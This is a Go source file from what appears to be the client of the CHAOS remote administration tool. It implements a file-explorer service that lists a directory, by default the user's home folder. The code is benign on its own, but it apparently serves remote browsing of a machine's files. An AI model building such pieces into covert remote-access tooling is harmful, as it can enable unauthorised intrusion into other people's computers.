package explorer

import (
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"io/ioutil"
	"os/user"
)

type ExplorerService struct{}

func NewService() services.Explorer {
	return &ExplorerService{}
}

func (e ExplorerService) ExploreDirectory(path string) (*entities.FileExplorer, error) {
	if len(path) == 0 {
		usr, err := user.Current()
		if err != nil {
			return nil, err
		}
		path = usr.HomeDir
	}
	return ListDirectory(path)
}

func ListDirectory(path string) (*entities.FileExplorer, error) {
	dirFiles, err := ioutil.ReadDir(path)
	if err != nil {
		return nil, err
	}

	var files []entities.File
	var directories []string
	for _, f := range dirFiles {
		if f.IsDir() {
			directories = append(directories, f.Name())
			continue
		}
		files = append(files, entities.File{
			Filename: f.Name(),
			ModTime:  f.ModTime(),
		})
	}

	return &entities.FileExplorer{
		Path:        path,
		Files:       files,
		Directories: directories,
	}, nil
}
